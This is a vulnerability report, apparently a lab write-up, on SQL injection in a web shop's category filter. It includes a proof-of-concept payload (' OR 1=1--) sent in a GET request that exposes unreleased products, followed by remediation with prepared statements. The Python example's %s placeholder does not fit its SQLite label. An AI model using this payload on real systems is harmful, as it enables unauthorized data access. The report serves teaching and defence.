# Vulnerability Report: SQL Injection in Category Filter Leading to Unauthorized Data Access

- **Vulnerability Type:** SQL Injection (CWE-89)
- **Severity:** High
- **Target Component:** Category Filter (`/filter?category=`)
- **OWASP Top 10 Mapping:** A03:2021 – Injection

---

## 1. Executive Summary
An SQL Injection (SQLi) vulnerability was identified in the application's product category filtering functionality. By appending malicious SQL operators to the `category` URL parameter, an unauthenticated user can alter the backend database query logic. This allows an attacker to bypass access controls and retrieve restricted data, including unreleased products.

---

## 2. Technical Analysis & Root Cause
The application accepts user input via the `category` query parameter and concatenates it directly into a dynamic SQL query without sanitization or parameterization.

### Vulnerable Query Pattern
```sql
SELECT * FROM products WHERE category = '<USER_INPUT>' AND released = 1;
```

Because input is not parameterized, an attacker can input single quotes (`'`) to escape the string context, inject custom Boolean logic (`OR 1=1`), and use database comment characters (`--`) to truncate the rest of the application's intended query logic.

---

## 3. Proof of Concept (PoC)

1. Intercept a legitimate product category request using an HTTP proxy (e.g., Burp Suite):
   ```http
   GET /filter?category=Gifts HTTP/1.1
   Host: target-app.net
   ```

2. Replace the `category` parameter value with the following payload:
   ```text
   ' OR 1=1--
   ```

3. Submit the modified HTTP GET request:
   ```http
   GET /filter?category=%27%20OR%201%3D1-- HTTP/1.1
   Host: target-app.net
   ```

4. **Result:** The application responds with **HTTP 200 OK**, returning all database records from the `products` table, including hidden and unreleased items where `released = 0`.

---

## 4. Impact
* **Confidentiality Breach:** Unauthorized access to proprietary or hidden company data.
* **Logic Bypass:** Disables core application business constraints (such as release flags or access controls).
* **Exploitation Escalation:** Depending on database permissions and schema structure, uncontrolled SQL injection can often be extended to extract sensitive user credentials, manipulate tables, or execute administrative commands.

---

## 5. Remediation & Developer Guidance

### Primary Fix: Parameterized Queries (Prepared Statements)
Do not concatenate user input directly into SQL strings. Instead, use **Prepared Statements**, which ensure the database engine treats all user input strictly as data, never as executable code.

#### Secure Code Implementation Example (Java / JDBC)
```java
// Secure implementation using PreparedStatements
String query = "SELECT * FROM products WHERE category = ? AND released = 1";
PreparedStatement stmt = connection.prepareStatement(query);
stmt.setString(1, userInputCategory);
ResultSet results = stmt.executeQuery();
```

#### Secure Code Implementation Example (Python / SQLite / PostgreSQL)
```python
# Secure implementation using parameterized queries
cursor.execute(
    "SELECT * FROM products WHERE category = %s AND released = 1",
    (user_input_category,)
)
```

---

## 6. References
* **CWE-89:** [Improper Neutralization of Special Elements used in an SQL Command](https://cwe.mitre.org/data/definitions/89.html)
* **OWASP:** [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)